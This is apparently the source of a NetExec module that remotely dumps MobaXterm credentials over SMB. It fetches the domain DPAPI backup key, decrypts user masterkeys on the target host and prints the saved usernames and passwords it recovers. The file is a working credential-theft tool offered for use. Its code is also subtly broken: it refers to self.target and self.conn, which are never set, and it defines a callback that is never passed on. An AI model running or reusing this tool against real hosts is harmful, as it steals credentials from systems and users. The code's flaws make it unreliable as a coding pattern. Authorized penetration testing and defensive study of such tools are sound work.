from dploot.triage.mobaxterm import MobaXtermTriage, MobaXtermCredential, MobaXtermPassword
from dploot.lib.target import Target

from nxc.helpers.logger import highlight
from nxc.protocols.smb.dpapi import collect_masterkeys_from_target, get_domain_backup_key, upgrade_to_dploot_connection


class NXCModule:
    name = "mobaxterm"
    description = "Remotely dump MobaXterm credentials via RemoteRegistry or NTUSER.dat export"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """ """

    def on_admin_login(self, context, connection):
        username = connection.username
        password = getattr(connection, "password", "")
        nthash = getattr(connection, "nthash", "")

        self.pvkbytes = get_domain_backup_key(connection)

        target = Target.create(
            domain=connection.domain,
            username=username,
            password=password,
            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
            lmhash=getattr(connection, "lmhash", ""),
            nthash=nthash,
            do_kerberos=connection.kerberos,
            aesKey=connection.aesKey,
            no_pass=True,
            use_kcache=getattr(connection, "use_kcache", False),
        )
        
        conn = upgrade_to_dploot_connection(connection=connection.conn, target=target)
        if conn is None:
            context.log.debug("Could not upgrade connection")
            return

        self.masterkeys = collect_masterkeys_from_target(connection, target, conn, system=False)

        if len(self.masterkeys) == 0:
            context.log.fail("No masterkeys looted")
            return

        context.log.success(f"Got {highlight(len(self.masterkeys))} decrypted masterkeys. Looting MobaXterm secrets")

        def mobaxterm_callback(credential):
            if isinstance(credential, MobaXtermCredential):
                log_text = "{} - {}:{}".format(credential.name, credential.username, credential.password.decode("latin-1"))
            elif isinstance(credential, MobaXtermPassword):
                log_text = "{}:{}".format(credential.username, credential.password.decode("latin-1"))
            context.log.highlight(f"[{credential.winuser}] {log_text}")

        try:
            triage = MobaXtermTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
            triage.triage_mobaxterm()
        except Exception as e:
            context.log.debug(f"Could not loot MobaXterm secrets: {e}")
